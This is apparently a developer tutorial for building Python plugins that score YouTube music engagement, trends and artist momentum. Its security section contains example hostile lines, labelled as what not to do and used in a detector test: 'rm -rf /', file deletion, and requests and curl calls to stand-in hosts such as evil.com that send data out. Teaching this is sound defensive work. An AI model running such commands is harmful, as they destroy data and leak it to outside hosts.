# Music Analytics Plugin Development Tutorial

A step-by-step guide to creating custom scoring algorithms for YouTube music analytics using the open-source plugin framework.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Your First Plugin](#your-first-plugin)
3. [Advanced Plugin Features](#advanced-plugin-features)
4. [Testing Your Plugin](#testing-your-plugin)
5. [Security Best Practices](#security-best-practices)
6. [Real-World Examples](#real-world-examples)
7. [Publishing Your Plugin](#publishing-your-plugin)

## Getting Started

### Prerequisites

- Python 3.8+
- pandas, numpy
- Access to YouTube analytics data
- Basic understanding of music industry metrics

### Installation

```bash
# Clone the repository
git clone https://github.com/your-repo/youtube-music-analytics
cd youtube-music-analytics

# Install dependencies
pip install -r requirements.txt

# Install in development mode
pip install -e .
```

### Understanding the Framework

The plugin framework consists of:

- **OpenSourceScoringPlugin**: Base class for all plugins
- **PluginMetadata**: Comprehensive plugin information
- **PluginValidator**: Ensures plugin quality and compatibility
- **PluginSecurityChecker**: Validates plugin security
- **PluginRegistry**: Manages plugin registration and discovery

## Your First Plugin

Let's create a simple engagement rate plugin that calculates basic engagement metrics.

### Step 1: Create the Plugin Class

```python
# my_first_plugin.py
import pandas as pd
from typing import Dict, Any
from src.data_organization.open_source_plugin_framework import (
    OpenSourceScoringPlugin, PluginMetadata
)
from src.data_organization.notebook_validator import ValidationResult

class SimpleEngagementPlugin(OpenSourceScoringPlugin):
    """
    A simple plugin that calculates engagement rates for YouTube videos.

    This plugin demonstrates the basic structure and requirements
    for creating custom music analytics algorithms.
    """

    def get_name(self) -> str:
        """Return unique plugin identifier."""
        return "simple_engagement"

    def get_version(self) -> str:
        """Return plugin version in semantic versioning format."""
        return "1.0.0"

    def get_metadata(self) -> PluginMetadata:
        """Return comprehensive plugin metadata."""
        return PluginMetadata(
            name="simple_engagement",
            version="1.0.0",
            author="Your Name",
            description="Calculates basic engagement rates for YouTube videos",
            parameters={
                "like_weight": 1.0,
                "comment_weight": 10.0,
                "min_views": 1000
            },
            input_requirements=[
                "video_id",
                "view_count",
                "like_count",
                "comment_count"
            ],
            output_schema={
                "video_id": "object",
                "engagement_rate": "float64",
                "engagement_category": "object",
                "weighted_engagement": "float64"
            },
            license="MIT",
            repository_url="https://github.com/your-username/music-plugins",
            tags=["engagement", "basic", "tutorial"]
        )

    def validate_input(self, data: pd.DataFrame) -> ValidationResult:
        """Validate that input data meets plugin requirements."""
        result = ValidationResult(
            is_valid=True,
            errors=[],
            warnings=[],
            checked_items=0,
            passed_items=0
        )

        # Check required columns
        required_cols = self.get_metadata().input_requirements
        for col in required_cols:
            result.checked_items += 1
            if col not in data.columns:
                result.add_error(f"Required column '{col}' not found")
            else:
                result.passed_items += 1

        # Check data types
        numeric_cols = ["view_count", "like_count", "comment_count"]
        for col in numeric_cols:
            if col in data.columns:
                result.checked_items += 1
                if not pd.api.types.is_numeric_dtype(data[col]):
                    result.add_error(f"Column '{col}' must be numeric")
                else:
                    result.passed_items += 1

        # Check for minimum data
        result.checked_items += 1
        if len(data) == 0:
            result.add_error("Input data is empty")
        else:
            result.passed_items += 1

        return result

    def calculate_scores(self, data: pd.DataFrame) -> pd.DataFrame:
        """Calculate engagement scores for the input data."""
        self._record_execution_start()

        try:
            # Get configuration parameters
            like_weight = self.config.get('like_weight', 1.0)
            comment_weight = self.config.get('comment_weight', 10.0)
            min_views = self.config.get('min_views', 1000)

            # Create a copy to avoid modifying original data
            result_data = data.copy()

            # Calculate basic engagement rate
            result_data['engagement_rate'] = (
                result_data['like_count'] + result_data['comment_count']
            ) / result_data['view_count'].replace(0, 1)  # Avoid division by zero

            # Calculate weighted engagement
            result_data['weighted_engagement'] = (
                (result_data['like_count'] * like_weight +
                 result_data['comment_count'] * comment_weight) /
                result_data['view_count'].replace(0, 1)
            )

            # Categorize engagement levels
            def categorize_engagement(rate):
                if rate >= 0.05:
                    return "high"
                elif rate >= 0.02:
                    return "medium"
                else:
                    return "low"

            result_data['engagement_category'] = result_data['engagement_rate'].apply(
                categorize_engagement
            )

            # Filter out videos with insufficient views
            result_data = result_data[result_data['view_count'] >= min_views]

            # Select only the columns specified in output schema
            output_cols = list(self.get_metadata().output_schema.keys())
            result_data = result_data[output_cols]

            self._record_execution_end(True)
            return result_data

        except Exception as e:
            self._record_execution_end(False, str(e))
            raise
```

### Step 2: Test Your Plugin

```python
# test_my_first_plugin.py
import pandas as pd
import pytest
from my_first_plugin import SimpleEngagementPlugin

def test_simple_engagement_plugin():
    """Test the SimpleEngagementPlugin functionality."""

    # Create sample data
    sample_data = pd.DataFrame({
        'video_id': ['video_1', 'video_2', 'video_3'],
        'view_count': [10000, 50000, 100000],
        'like_count': [500, 2000, 3000],
        'comment_count': [50, 200, 300]
    })

    # Create and configure plugin
    plugin = SimpleEngagementPlugin()
    plugin.load_configuration({
        'like_weight': 1.0,
        'comment_weight': 10.0,
        'min_views': 1000
    })

    # Validate input
    validation_result = plugin.validate_input(sample_data)
    assert validation_result.is_valid, f"Validation failed: {validation_result.errors}"

    # Calculate scores
    results = plugin.calculate_scores(sample_data)

    # Verify results
    assert len(results) == 3
    assert 'engagement_rate' in results.columns
    assert 'engagement_category' in results.columns
    assert 'weighted_engagement' in results.columns

    # Check that engagement rates are calculated correctly
    expected_rate_1 = (500 + 50) / 10000  # 0.055
    assert abs(results.iloc[0]['engagement_rate'] - expected_rate_1) < 0.001

    print("✅ Plugin test passed!")

if __name__ == "__main__":
    test_simple_engagement_plugin()
```

### Step 3: Register and Use Your Plugin

```python
# use_plugin.py
import pandas as pd
from src.data_organization.open_source_plugin_framework import PluginRegistry
from my_first_plugin import SimpleEngagementPlugin

# Create registry and register plugin
registry = PluginRegistry()
plugin = SimpleEngagementPlugin()

# Register the plugin
registration_result = registry.register_plugin(plugin)
if registration_result.is_valid:
    print("✅ Plugin registered successfully!")
else:
    print(f"❌ Registration failed: {registration_result.errors}")

# Load some YouTube data (replace with your actual data loading)
youtube_data = pd.DataFrame({
    'video_id': ['vid_1', 'vid_2', 'vid_3', 'vid_4'],
    'view_count': [15000, 75000, 120000, 8000],
    'like_count': [750, 3000, 4500, 200],
    'comment_count': [75, 300, 450, 20]
})

# Get the plugin and configure it
engagement_plugin = registry.get_plugin("simple_engagement")
engagement_plugin.load_configuration({
    'like_weight': 1.2,
    'comment_weight': 8.0,
    'min_views': 10000
})

# Calculate scores
results = engagement_plugin.calculate_scores(youtube_data)
print("\n📊 Engagement Analysis Results:")
print(results)

# Export results
engagement_plugin.export_results(results, "csv", "engagement_results.csv")
print("\n💾 Results exported to engagement_results.csv")
```

## Advanced Plugin Features

### Configuration Management

```python
def _validate_configuration(self):
    """Override to add custom configuration validation."""
    super()._validate_configuration()

    # Custom validation logic
    like_weight = self.config.get('like_weight', 1.0)
    if like_weight < 0 or like_weight > 10:
        raise ValueError("like_weight must be between 0 and 10")

    comment_weight = self.config.get('comment_weight', 10.0)
    if comment_weight < 0 or comment_weight > 100:
        raise ValueError("comment_weight must be between 0 and 100")
```

### Time-Series Analysis Plugin

```python
class TrendAnalysisPlugin(OpenSourceScoringPlugin):
    """
    Advanced plugin that analyzes trends over time.

    This plugin demonstrates working with time-series data
    and calculating momentum-based scores.
    """

    def get_name(self) -> str:
        return "trend_analysis"

    def get_version(self) -> str:
        return "1.0.0"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="trend_analysis",
            version="1.0.0",
            author="Advanced Tutorial",
            description="Analyzes view trends and momentum over time",
            parameters={
                "trend_window_days": 7,
                "momentum_threshold": 0.1,
                "smoothing_factor": 0.3
            },
            input_requirements=[
                "video_id",
                "view_count",
                "analytics_date"
            ],
            output_schema={
                "video_id": "object",
                "trend_score": "float64",
                "momentum_category": "object",
                "daily_growth_rate": "float64"
            },
            tags=["trends", "momentum", "time-series"]
        )

    def calculate_scores(self, data: pd.DataFrame) -> pd.DataFrame:
        """Calculate trend-based scores."""
        self._record_execution_start()

        try:
            # Configuration
            window_days = self.config.get('trend_window_days', 7)
            momentum_threshold = self.config.get('momentum_threshold', 0.1)
            smoothing_factor = self.config.get('smoothing_factor', 0.3)

            # Ensure datetime column
            data = data.copy()
            data['analytics_date'] = pd.to_datetime(data['analytics_date'])

            results = []

            # Analyze trends for each video
            for video_id, video_data in data.groupby('video_id'):
                if len(video_data) < 2:
                    continue

                # Sort by date
                video_data = video_data.sort_values('analytics_date')

                # Calculate daily growth rates
                video_data['daily_growth'] = video_data['view_count'].pct_change()

                # Apply exponential smoothing
                smoothed_growth = video_data['daily_growth'].ewm(
                    alpha=smoothing_factor
                ).mean()

                # Calculate trend score
                recent_growth = smoothed_growth.tail(window_days).mean()
                trend_score = max(0, min(1, recent_growth * 10))  # Normalize to 0-1

                # Categorize momentum
                if recent_growth > momentum_threshold:
                    momentum_category = "accelerating"
                elif recent_growth > 0:
                    momentum_category = "growing"
                elif recent_growth > -momentum_threshold:
                    momentum_category = "stable"
                else:
                    momentum_category = "declining"

                results.append({
                    'video_id': video_id,
                    'trend_score': trend_score,
                    'momentum_category': momentum_category,
                    'daily_growth_rate': recent_growth
                })

            result_df = pd.DataFrame(results)
            self._record_execution_end(True)
            return result_df

        except Exception as e:
            self._record_execution_end(False, str(e))
            raise
```

## Testing Your Plugin

### Unit Testing Framework

```python
# test_framework.py
import unittest
import pandas as pd
from datetime import datetime, timedelta
from my_first_plugin import SimpleEngagementPlugin

class TestSimpleEngagementPlugin(unittest.TestCase):
    """Comprehensive test suite for SimpleEngagementPlugin."""

    def setUp(self):
        """Set up test fixtures."""
        self.plugin = SimpleEngagementPlugin()
        self.sample_data = pd.DataFrame({
            'video_id': ['test_1', 'test_2', 'test_3'],
            'view_count': [10000, 50000, 100000],
            'like_count': [500, 2000, 3000],
            'comment_count': [50, 200, 300]
        })

    def test_plugin_metadata(self):
        """Test plugin metadata is complete and valid."""
        metadata = self.plugin.get_metadata()

        self.assertEqual(metadata.name, "simple_engagement")
        self.assertEqual(metadata.version, "1.0.0")
        self.assertIsInstance(metadata.parameters, dict)
        self.assertIsInstance(metadata.input_requirements, list)
        self.assertIsInstance(metadata.output_schema, dict)

        # Test metadata validation
        validation_result = metadata.validate()
        self.assertTrue(validation_result.is_valid)

    def test_input_validation_valid(self):
        """Test input validation with valid data."""
        result = self.plugin.validate_input(self.sample_data)
        self.assertTrue(result.is_valid)
        self.assertEqual(len(result.errors), 0)

    def test_input_validation_missing_columns(self):
        """Test input validation with missing columns."""
        invalid_data = self.sample_data.drop('like_count', axis=1)
        result = self.plugin.validate_input(invalid_data)

        self.assertFalse(result.is_valid)
        self.assertTrue(any('like_count' in error for error in result.errors))

    def test_score_calculation(self):
        """Test score calculation functionality."""
        self.plugin.load_configuration({
            'like_weight': 1.0,
            'comment_weight': 10.0,
            'min_views': 1000
        })

        results = self.plugin.calculate_scores(self.sample_data)

        # Verify output structure
        self.assertEqual(len(results), 3)
        expected_columns = ['video_id', 'engagement_rate', 'engagement_category', 'weighted_engagement']
        for col in expected_columns:
            self.assertIn(col, results.columns)

        # Verify calculations
        first_row = results.iloc[0]
        expected_rate = (500 + 50) / 10000  # 0.055
        self.assertAlmostEqual(first_row['engagement_rate'], expected_rate, places=3)

    def test_configuration_validation(self):
        """Test configuration parameter validation."""
        # Valid configuration
        valid_config = {'like_weight': 1.5, 'comment_weight': 8.0, 'min_views': 500}
        self.plugin.load_configuration(valid_config)
        self.assertEqual(self.plugin.config, valid_config)

    def test_edge_cases(self):
        """Test edge cases and error handling."""
        # Empty data
        empty_data = pd.DataFrame(columns=['video_id', 'view_count', 'like_count', 'comment_count'])
        validation_result = self.plugin.validate_input(empty_data)
        self.assertFalse(validation_result.is_valid)

        # Zero view counts
        zero_views_data = self.sample_data.copy()
        zero_views_data.loc[0, 'view_count'] = 0

        self.plugin.load_configuration({'min_views': 0})
        results = self.plugin.calculate_scores(zero_views_data)

        # Should handle division by zero gracefully
        self.assertFalse(results['engagement_rate'].isna().any())

if __name__ == '__main__':
    unittest.main()
```

### Integration Testing

```python
# integration_test.py
import pandas as pd
from src.data_organization.open_source_plugin_framework import PluginRegistry, PluginValidator
from my_first_plugin import SimpleEngagementPlugin

def test_plugin_integration():
    """Test complete plugin integration workflow."""

    # Create registry and validator
    registry = PluginRegistry()
    validator = PluginValidator()

    # Create plugin
    plugin = SimpleEngagementPlugin()

    # Test plugin structure validation
    structure_result = validator.validate_plugin_structure(plugin)
    assert structure_result.is_valid, f"Structure validation failed: {structure_result.errors}"

    # Test metadata validation
    metadata = plugin.get_metadata()
    metadata_result = validator.validate_plugin_metadata(metadata)
    assert metadata_result.is_valid, f"Metadata validation failed: {metadata_result.errors}"

    # Register plugin
    registration_result = registry.register_plugin(plugin)
    assert registration_result.is_valid, f"Registration failed: {registration_result.errors}"

    # Test plugin retrieval
    retrieved_plugin = registry.get_plugin("simple_engagement")
    assert retrieved_plugin is not None
    assert retrieved_plugin.get_name() == "simple_engagement"

    # Test plugin execution
    test_data = pd.DataFrame({
        'video_id': ['integration_test'],
        'view_count': [25000],
        'like_count': [1250],
        'comment_count': [125]
    })

    retrieved_plugin.load_configuration({'min_views': 1000})
    results = retrieved_plugin.calculate_scores(test_data)

    assert len(results) == 1
    assert 'engagement_rate' in results.columns

    print("✅ Integration test passed!")

if __name__ == "__main__":
    test_plugin_integration()
```

## Security Best Practices

### Safe Plugin Development

```python
# ✅ GOOD: Safe operations
def calculate_scores(self, data: pd.DataFrame) -> pd.DataFrame:
    """Safe plugin implementation."""

    # ✅ Data manipulation with pandas
    result = data.copy()
    result['score'] = data['view_count'] * 0.001

    # ✅ Mathematical calculations
    import numpy as np
    result['normalized_score'] = np.log1p(result['score'])

    # ✅ Statistical analysis
    mean_score = result['score'].mean()
    result['score_vs_mean'] = result['score'] / mean_score

    return result

# ❌ BAD: Dangerous operations
def dangerous_plugin(self, data: pd.DataFrame) -> pd.DataFrame:
    """Example of what NOT to do."""

    # ❌ File system access
    import os
    os.system("rm important_file.txt")

    # ❌ Network requests
    import requests
    requests.get("http://malicious-site.com/steal-data")

    # ❌ Dynamic code execution
    eval("malicious_code()")

    # ❌ System access
    import subprocess
    subprocess.call(["curl", "evil.com"])

    return data
```

### Security Validation

```python
# security_test.py
from src.data_organization.open_source_plugin_framework import PluginSecurityChecker

def test_plugin_security():
    """Test plugin security validation."""

    security_checker = PluginSecurityChecker()

    # Test safe code
    safe_code = '''
import pandas as pd
import numpy as np

def calculate_scores(data):
    return data.assign(score=data['view_count'] * 0.001)
'''

    result = security_checker.check_plugin_security(safe_code)
    assert result.is_valid, f"Safe code failed security check: {result.errors}"

    # Test dangerous code
    dangerous_code = '''
import os
import subprocess

def malicious_function():
    os.system("rm -rf /")
    subprocess.call(["curl", "evil.com"])
'''

    result = security_checker.check_plugin_security(dangerous_code)
    assert not result.is_valid, "Dangerous code passed security check"

    print("✅ Security validation working correctly!")

if __name__ == "__main__":
    test_plugin_security()
```

## Real-World Examples

### Artist Momentum Plugin

```python
class ArtistMomentumPlugin(OpenSourceScoringPlugin):
    """
    Real-world plugin for calculating artist momentum across multiple videos.

    This plugin demonstrates how to work with grouped data and
    calculate aggregate metrics for music industry analysis.
    """

    def get_name(self) -> str:
        return "artist_momentum"

    def get_version(self) -> str:
        return "1.0.0"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="artist_momentum",
            version="1.0.0",
            author="Music Industry Analytics",
            description="Calculates momentum scores for music artists based on recent performance",
            parameters={
                "momentum_window_days": 30,
                "view_weight": 0.4,
                "engagement_weight": 0.3,
                "growth_weight": 0.3,
                "min_videos": 3
            },
            input_requirements=[
                "artist_name",
                "video_id",
                "view_count",
                "like_count",
                "comment_count",
                "published_date"
            ],
            output_schema={
                "artist_name": "object",
                "momentum_score": "float64",
                "momentum_category": "object",
                "total_videos": "int64",
                "avg_engagement_rate": "float64"
            },
            tags=["artist", "momentum", "music-industry", "aggregation"]
        )

    def calculate_scores(self, data: pd.DataFrame) -> pd.DataFrame:
        """Calculate artist momentum scores."""
        self._record_execution_start()

        try:
            # Configuration
            window_days = self.config.get('momentum_window_days', 30)
            view_weight = self.config.get('view_weight', 0.4)
            engagement_weight = self.config.get('engagement_weight', 0.3)
            growth_weight = self.config.get('growth_weight', 0.3)
            min_videos = self.config.get('min_videos', 3)

            # Prepare data
            data = data.copy()
            data['published_date'] = pd.to_datetime(data['published_date'])

            # Filter to recent videos
            cutoff_date = data['published_date'].max() - pd.Timedelta(days=window_days)
            recent_data = data[data['published_date'] >= cutoff_date]

            results = []

            # Calculate momentum for each artist
            for artist, artist_data in recent_data.groupby('artist_name'):
                if len(artist_data) < min_videos:
                    continue

                # Calculate metrics
                total_views = artist_data['view_count'].sum()
                total_likes = artist_data['like_count'].sum()
                total_comments = artist_data['comment_count'].sum()
                total_videos = len(artist_data)

                # Engagement rate
                engagement_rate = (total_likes + total_comments) / max(total_views, 1)

                # View momentum (normalized by video count)
                avg_views_per_video = total_views / total_videos
                view_momentum = min(avg_views_per_video / 100000, 1.0)  # Normalize to 100k views

                # Growth momentum (based on recent vs older videos)
                artist_data_sorted = artist_data.sort_values('published_date')
                if len(artist_data_sorted) >= 2:
                    recent_half = artist_data_sorted.tail(len(artist_data_sorted) // 2)
                    older_half = artist_data_sorted.head(len(artist_data_sorted) // 2)

                    recent_avg = recent_half['view_count'].mean()
                    older_avg = older_half['view_count'].mean()

                    growth_momentum = max(0, min(1, (recent_avg-older_avg) / max(older_avg, 1)))
                else:
                    growth_momentum = 0.5  # Neutral for insufficient data

                # Combined momentum score
                momentum_score = (
                    view_weight * view_momentum +
                    engagement_weight * min(engagement_rate * 20, 1.0) +  # Scale engagement
                    growth_weight * growth_momentum
                )

                # Categorize momentum
                if momentum_score >= 0.8:
                    category = "explosive"
                elif momentum_score >= 0.6:
                    category = "strong"
                elif momentum_score >= 0.4:
                    category = "moderate"
                else:
                    category = "weak"

                results.append({
                    'artist_name': artist,
                    'momentum_score': momentum_score,
                    'momentum_category': category,
                    'total_videos': total_videos,
                    'avg_engagement_rate': engagement_rate
                })

            result_df = pd.DataFrame(results)
            self._record_execution_end(True)
            return result_df

        except Exception as e:
            self._record_execution_end(False, str(e))
            raise
```

### Usage Example with Real Data

```python
# real_world_usage.py
import pandas as pd
from src.data_organization.open_source_plugin_framework import PluginRegistry
from artist_momentum_plugin import ArtistMomentumPlugin

# Load real YouTube data (example query)
def load_youtube_data():
    """Load YouTube data from database or CSV."""
    # This would typically connect to your database
    # For demo purposes, we'll create sample data

    artists = ['Taylor Swift', 'Drake', 'Billie Eilish', 'The Weeknd']
    data_points = []

    for artist in artists:
        for i in range(5):  # 5 videos per artist
            data_points.append({
                'artist_name': artist,
                'video_id': f'{artist.replace(" ", "_")}_video_{i}',
                'view_count': np.random.randint(1000000, 50000000),
                'like_count': np.random.randint(50000, 2000000),
                'comment_count': np.random.randint(5000, 200000),
                'published_date': pd.Timestamp.now() - pd.Timedelta(days=np.random.randint(1, 60))
            })

    return pd.DataFrame(data_points)

# Main analysis
def analyze_artist_momentum():
    """Perform artist momentum analysis."""

    # Load data
    youtube_data = load_youtube_data()
    print(f"📊 Loaded {len(youtube_data)} videos from {youtube_data['artist_name'].nunique()} artists")

    # Set up plugin
    registry = PluginRegistry()
    plugin = ArtistMomentumPlugin()

    # Register plugin
    registration_result = registry.register_plugin(plugin)
    if not registration_result.is_valid:
        print(f"❌ Plugin registration failed: {registration_result.errors}")
        return

    # Configure plugin
    momentum_plugin = registry.get_plugin("artist_momentum")
    momentum_plugin.load_configuration({
        'momentum_window_days': 45,
        'view_weight': 0.5,
        'engagement_weight': 0.3,
        'growth_weight': 0.2,
        'min_videos': 2
    })

    # Calculate momentum scores
    momentum_results = momentum_plugin.calculate_scores(youtube_data)

    # Display results
    print("\n🎵 Artist Momentum Analysis Results:")
    print("=" * 60)

    # Sort by momentum score
    momentum_results = momentum_results.sort_values('momentum_score', ascending=False)

    for _, row in momentum_results.iterrows():
        print(f"🎤 {row['artist_name']}")
        print(f"   Momentum Score: {row['momentum_score']:.3f} ({row['momentum_category']})")
        print(f"   Videos Analyzed: {row['total_videos']}")
        print(f"   Avg Engagement Rate: {row['avg_engagement_rate']:.4f}")
        print()

    # Export results
    momentum_plugin.export_results(momentum_results, "csv", "artist_momentum_analysis.csv")
    print("💾 Results exported to artist_momentum_analysis.csv")

    return momentum_results

if __name__ == "__main__":
    results = analyze_artist_momentum()
```

## Publishing Your Plugin

### Plugin Package Structure

```
my_music_plugin/
├── README.md
├── setup.py
├── requirements.txt
├── my_music_plugin/
│   ├── __init__.py
│   ├── plugin.py
│   └── utils.py
├── tests/
│   ├── __init__.py
│   ├── test_plugin.py
│   └── test_integration.py
├── examples/
│   ├── basic_usage.py
│   └── advanced_example.py
└── docs/
    ├── API.md
    └── TUTORIAL.md
```

### Setup.py Example

```python
# setup.py
from setuptools import setup, find_packages

setup(
    name="my-music-analytics-plugin",
    version="1.0.0",
    author="Your Name",
    author_email="your.email@example.com",
    description="Custom music analytics plugin for YouTube data",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/your-username/my-music-plugin",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 4-Beta",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Topic :: Multimedia :: Sound/Audio :: Analysis",
        "Topic :: Scientific/Engineering :: Information Analysis",
    ],
    python_requires=">=3.8",
    install_requires=[
        "pandas>=1.3.0",
        "numpy>=1.21.0",
    ],
    extras_require={
        "dev": [
            "pytest>=6.0",
            "black>=21.0",
            "flake8>=3.9",
        ],
    },
    entry_points={
        "music_analytics_plugins": [
            "my_plugin = my_music_plugin.plugin:MyMusicPlugin",
        ],
    },
)
```

### README Template

```markdown
# My Music Analytics Plugin

A custom plugin for analyzing [specific aspect] in YouTube music data.

## Features

- 🎵 [Feature 1]
- 📊 [Feature 2]
- 🚀 [Feature 3]

## Installation

```bash
pip install my-music-analytics-plugin
```

## Quick Start

```python
from my_music_plugin import MyMusicPlugin
from src.data_organization.open_source_plugin_framework import PluginRegistry

# Register plugin
registry = PluginRegistry()
plugin = MyMusicPlugin()
registry.register_plugin(plugin)

# Use plugin
results = plugin.calculate_scores(your_data)
```

## Configuration

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `param1` | float | 0.5 | Description of param1 |
| `param2` | int | 10 | Description of param2 |

## Contributing

1. Fork the repository
2. Create a feature branch
3. Add tests for your changes
4. Submit a pull request

## License

MIT License-see LICENSE file for details.
```

### Publishing Checklist

- [ ] **Code Quality**
  - [ ] All tests pass
  - [ ] Code follows style guidelines
  - [ ] Documentation is complete
  - [ ] Security validation passes

- [ ] **Plugin Validation**
  - [ ] Metadata is complete and accurate
  - [ ] Input/output schemas are documented
  - [ ] Configuration parameters are validated
  - [ ] Error handling is robust

- [ ] **Documentation**
  - [ ] README with clear usage examples
  - [ ] API documentation
  - [ ] Configuration guide
  - [ ] Troubleshooting section

- [ ] **Testing**
  - [ ] Unit tests for all methods
  - [ ] Integration tests
  - [ ] Performance benchmarks
  - [ ] Edge case handling

- [ ] **Community**
  - [ ] GitHub repository with issues enabled
  - [ ] Contributing guidelines
  - [ ] Code of conduct
  - [ ] License file

## Next Steps

1. **Explore Advanced Features**: Look at the example plugins for more complex patterns
2. **Join the Community**: Contribute to the main framework repository
3. **Share Your Work**: Publish your plugins for others to use
4. **Benchmark Performance**: Use the built-in benchmarking tools
5. **Collaborate**: Work with other music data researchers

## Resources

- [Framework Documentation](../README_open_source_plugins.md)
- [Example Plugins](../example_open_source_plugins.py)
- [Security Guidelines](../open_source_plugin_framework.py)
- [Community Forum](https://github.com/music-analytics/discussions)

---

*Happy plugin development! 🎵📊*
